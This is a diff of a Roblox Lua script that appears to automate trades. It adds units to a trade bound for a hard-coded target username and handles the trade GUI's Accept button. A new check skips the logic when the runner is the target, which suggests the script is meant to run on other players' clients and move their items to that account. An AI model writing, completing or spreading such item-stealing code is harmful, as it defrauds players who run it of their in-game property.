@@ -1,10 +1,17 @@
-local addUnits = {"unit_rafflesia", "unit_christmas_bell"}
+-- ===== CONFIG =====
+local targetUsername = "dusfuxxx"
+local addUnits = {"unit_frozen_spike"}
 local receiveUnits = {}
-local repeatCounts = {unit_rafflesia = 3, unit_christmas_bell = 4}
-local targetUsername = "dusfuxx"
+local repeatCounts = {unit_frozen_spike = 3}
+-- ==================
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
+
+if player.Name == targetUsername then
+    return
+end
+
 local gui = player:WaitForChild("PlayerGui"):WaitForChild("GameGui")
 local screen = gui:WaitForChild("Screen")
 local sidebar = screen.Left.Sidebar
@@ -90,10 +97,8 @@ task.spawn(function()
     local receiveFrame = trade.Items.Container.Items.Right.Receive.Items.ScrollingFrame
     local acceptBtn = trade.Items.Container.Items.Right.Controls.Items.Buttons.Accept
     local function hasWantedUnit()
-        local foundAny = false
         for _, item in ipairs(receiveFrame:GetChildren()) do
             if item:IsA("Frame") then
-                foundAny = true
                 if #receiveUnits == 0 then return true end
                 for _, want in ipairs(receiveUnits) do
                     if item.Name == want then return true end
